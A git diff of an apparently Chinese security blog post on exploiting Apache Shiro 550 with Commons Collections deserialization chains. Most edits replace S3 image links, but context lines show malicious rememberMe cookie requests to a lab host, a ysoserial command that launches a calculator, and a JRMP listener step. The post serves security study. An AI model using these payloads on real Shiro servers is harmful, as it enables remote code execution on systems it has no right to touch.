@@ -9,7 +9,8 @@ updated: 2023-03-20T00:00:00+00:00
 date: 2023-01-22T00:00:00+00:00
 slug: attacking-shiro550-with-commons-collections
 title: 利用Commons Collections攻击Shiro550
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c4f94bdc-260e-4069-9f10-940bb0fbc96e/18.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=8e534d1bef3c7ab048777d5d0bb76c1e7d01f69c2ee148da41f2c0b31c46e60b&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/attacking-shiro550-with-commons-collections/17.png
+
 id: 111906e1-7468-80b4-8170-e19188f37e1d
 ---
 
@@ -24,7 +25,7 @@ id: 111906e1-7468-80b4-8170-e19188f37e1d
 这里先以 3.2.1 版本的 Commons Collections 为例，我们首先在 Shiro 项目中通过 Maven 引入它的依赖。
 
 ```xml
-<!-- <https://mvnrepository.com/artifact/commons-collections/commons-collections> -->
+<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
 <dependency>
     <groupId>commons-collections</groupId>
     <artifactId>commons-collections</artifactId>
@@ -34,7 +35,7 @@ id: 111906e1-7468-80b4-8170-e19188f37e1d
 
 跟此前利用 CommonsBeanutils1 的方式一样，对 CommonsCollections6 生成的反序列化数据进行加密和编码，然后构造恶意 HTTP 请求并发送，如下。
 
-```text
+```http
 GET / HTTP/1.1
 Host: 10.11.34.121:8888
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
@@ -53,7 +54,7 @@ Connection: close
 
 回到 IDEA 中检查日志，可发现出现了如下异常报错日志。
 
-```text
+```
 Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.
 	at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)
 	at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)
@@ -225,11 +226,11 @@ public ClassLoader getContextClassLoader() {
 
 如下图所示，当 fqcn 为 java.util.HashMap 时，继续往下 Step Over 便会成功加载到类。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ee5846fe-c4ba-43e8-80a9-32e3e606b120/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b50209320f10fbdb0ccce773fc4751a90194c73572d86066f2d08e4b3d91e675&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/0.png)
 
 但当 fqcn 为[Lorg.apache.commons.collections.Transformer;时，继续跟下去，就会抛出 ClassNotFoundException 异常。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d2a74128-bfd4-4442-b795-a180928bffa2/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2d011066ec316e3fda29f03a637dc24f7bd2b2435121e0ec695f94e943e50270&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/1.png)
 
 此处的[L 表示一个数组类型的描述符，;表示类型描述符的结束，所以这里的[Lorg.apache.commons.collections.Transformer;表示的是一个 Transformer 类型的数组。
 
@@ -239,13 +240,13 @@ public ClassLoader getContextClassLoader() {
 
 据此，我们先将 Tomcat 的源码导入至 IDEA 项目。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e9d3480a-1207-42ee-aa85-9a7b09048d69/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=cc560bed17150d19e28fab7cff5c43856af93f3bcf5f607ec12a49ca75e6d959&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/2.png)
 
 再将断点断在 org.apache.shiro.util.ClassUtils#forName，从 THREAD_CL_ACCESSOR.loadClass 跟起。
 
 进入 loadClass 方法，在其中获取到的 ClassLoader 为 ParallelWebappClassLoader，它的父 Classloader 为 URLClassLoader。
 
-```text
+```
 ParallelWebappClassLoader
   context: ROOT
   delegate: false
@@ -253,51 +254,51 @@ ParallelWebappClassLoader
 java.net.URLClassLoader@28c4711c
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/92e31ae7-46ae-4909-98cf-f6cd8e73bb84/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=5322faa770423340f5e1d0dac7d84b0837cb08d3715e6974766d69b4937e7c63&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/3.png)
 
 继续往下，到达 org.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)。在这个方法中，会有两次检查先前加载的本地类缓存，但都未果。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/76d47263-a411-4c0d-a87b-395e0fa2eca8/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=8f7b36892c3b0506bf0d0467a320ab76929cf58f92089054270fdf5c047d5112&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/4.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/7ffcea64-ab84-4f31-8819-e1b0310fb3e8/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=c3e83008d031a57a27b68f743c81e530e9fbdb5593d4b2317f3addecc6558a00&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/5.png)
 
 接着，会尝试使用系统类加载器加载类，这个时候的 resourceName 成了[Lorg/apache/commons/collections/Transformer;.class。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/aafd7d02-d1da-4264-9b8d-b07cf53d6b1e/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=04c920660ae080fa228492415e6ef8bb3e58cb49d69ad7550e59ecab2263e6ed&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/6.png)
 
 继续朝下，根据 url = javaseLoader.getResource(resourceName)，url 就会为 null，近而 tryLoadingFromJavaseLoader 会为 false。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/11171dd7-3d6a-4f77-9e0b-e1ba57bf2024/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=208841d4c8df21e791092c50cb84274914080caf2c96b84d831330c5f320aca5&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/7.png)
 
 继续搜索本地仓库。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ab947a02-dba7-49f0-8b1c-9cc3d14c998c/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=f2c7278eb6068e2ab3d320a1333195c99db04c44d4fddb19886c0e4bba4f2fa7&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/8.png)
 
 进入到 WebappClassLoaderBase#findClass 方法中。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5f330d57-324a-4712-973c-80667bef7c52/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=3f8e7ab6d0e5ea120291e91026043c28b7bb610d49a7cf35abe6ba5cfea25a81&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/9.png)
 
 一路跟下去，在 855 行对 findClassInternal 方法进行了调用。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/edf35ce7-3620-4ae4-a5c9-42bb390fcce8/10.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=03ad1ea08203cb62b105d569e6459c62c200785c90090c77232697aea843e8df&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/10.png)
 
 在 findClassInternal 方法中 path 成了/[Lorg/apache/commons/collections/Transformer;.class，这当然是依旧找不到。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/47784076-1e4b-4933-9b78-7194b6a0be19/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7fd367422238391249e72aa269ad3345bdb69d8c46f402d46dc58d1f40081d16&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/11.png)
 
 只会返回 null 到 findClass 中的 clazz。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a562ed4a-c004-4f6b-917c-2a18ace586d2/12.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=aee55dbf09c71271b22c09413ef386d23b98b80a3a43a0da51aae89fca6ba867&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/12.png)
 
 findClass 方法也会返回 null 到 loadClass 方法中。继续往下，就会委派到父类加载器进行查找，也就是 URLClassLoader。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5b816916-fabd-48fa-9946-5125d70b82f9/13.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=d9e8d14d6a87d76dc10202e1a2f15eea532a4facf06d6cd33d37ed7fa0c33a82&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/13.png)
 
 到达 java.lang.Class，但在 URLClassLoader 类加载器中只加载了 Tomcat 下的 lib 包，其中并无所需的 commons-collections-3.2.1.jar。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e98f0ad9-34ff-41c2-8d60-85691959dc7b/14.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=04aad233267f477ec6f651cc562175c9e9ed858c1078d997575a6de24eda9728&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/14.png)
 
-```text
+```
 [file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/,
 file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ko.jar,
 file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/el-api.jar,
@@ -332,7 +333,7 @@ file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-dbcp.jar]
 
 这就导致了 ClassNotFoundException 异常的抛出。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/4dfb81ee-a39e-45a9-bc11-bb2b74c45cd9/15.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b1a68a9eb650f6ba2b5f7ce422bbb0a287bb66b8fdd3fcc45e2b9644eab15b96&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/15.png)
 
 ## JRMP
 
@@ -398,7 +399,7 @@ print("Cookie: rememberMe={}".format(base64.b64encode(iv + encryptor.encrypt(pad
 
 最后，发送构造的恶意 HTTP 请求。
 
-```text
+```http
 GET / HTTP/1.1
 Host: 10.11.34.121:8888
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
@@ -413,11 +414,11 @@ Connection: close
 
 可以观察到 JRMPListener 端会收到来自 Shiro 应用程序的请求。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/92b6d064-4a37-4989-b052-3d1387117a90/16.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=547ef4448942db5641cf10c5ae1900c1417aa2a14eee403ddcd86e60a853678d&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/16.png)
 
 最终，成功执行命令，弹出计算器。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/14be08df-6086-405f-998f-0130fa78c57e/17.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=23e63762ce1ec6cb1368adfb1d3e6919e09efa3bce3f78633280e57b5895ade9&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/17.png)
 
 ## CommonsCollections4Shiro
 
@@ -515,7 +516,7 @@ public class ShiroAttackWithCC {
 
 发送如下 HTTP 请求，即可弹出计算器。
 
-```text
+```http
 GET / HTTP/1.1
 Host: 10.11.34.121:8888
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
@@ -538,7 +539,7 @@ java -jar ysoserial-all.jar CommonsCollections2 "open -a Calculator" > cc2.ser
 
 依旧使用如上 Python 脚本对 cc2.ser 进行加密与编码，然后构造如下请求，并发送。
 
-```text
+```http
 GET / HTTP/1.1
 Host: 10.11.34.121:8888
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
@@ -553,7 +554,7 @@ Connection: close
 
 最终成功弹出计算器。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c7b014ce-9feb-4696-b8dc-ba6851405ae2/18.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050159Z&X-Amz-Expires=3600&X-Amz-Signature=c225a0d7d1a5a826a408e7e1e951fb6dca51ed3cf10f4d267acdb695d0eb7cd1&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/attacking-shiro550-with-commons-collections/18.png)
 
 CommonsCollections2 与 CommonsBeanutils1 很类似，Kick-off 与 Sink 都相同，二者的不同点在于中间 Gadget 链的不同，CommonsCollections2 通过在 org.apache.commons.collections4.comparators.TransformingComparator#compare 方法中触发 org.apache.commons.collections4.functors.InvokerTransformer#transform 方法的调用，最终在 InvokerTransformer#transform 方法中通过反射调用 TemplatesImpl 执行任意恶意字节码。
 
@@ -561,6 +562,8 @@ CommonsCollections2 与 CommonsBeanutils1 很类似，Kick-off 与 Sink 都相�
 
 ## 参考
 
-- [https://xz.aliyun.com/t/7950](https://xz.aliyun.com/t/7950)
-- [https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java)
-- [https://github.com/phith0n/JavaThings/](https://github.com/phith0n/JavaThings/)
+- https://xz.aliyun.com/t/7950
+
+- https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java
+
+- https://github.com/phith0n/JavaThings/
